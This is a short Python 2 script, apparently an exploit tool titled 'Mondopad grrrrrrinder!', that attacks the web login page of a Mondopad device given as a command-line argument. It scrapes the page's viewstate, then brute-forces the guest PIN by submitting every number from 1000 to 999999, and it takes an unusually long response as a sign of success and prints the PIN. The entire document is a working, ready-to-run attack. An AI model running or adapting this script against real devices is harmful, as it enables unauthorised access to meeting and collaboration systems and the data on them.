#!/usr/bin/python

print "Mondopad grrrrrrinder!"

import requests
import re
import sys

#Get viewstate
r=requests.get("http://"+sys.argv[1]+"/Pages/Login.aspx")
a=re.findall('\"/.*\"',r.text)
viewstate=a[0][1:-1]
#print viewstate

for i in range(1000,999999):
	r=requests.post("http://"+sys.argv[1]+"/Pages/Login.aspx",data={'__EVENTTARGET':'','__EVENTARGUMENT':'','__VIEWSTATE':viewstate,'__VIEWSTATEGENERATOR':'D44F3332','ctl00$contentPlaceContainer$UC_Login1$tbGuestCode':i,'ctl00$contentPlaceContainer$UC_Login1$btnGustLogin':'Login'})
	#print r.text
	if int(r.headers['Content-Length']) > 6655:
		#print str(i)+" "+str(r.headers['Content-Length'])
		print "The PIN is %s" %(i)
		break
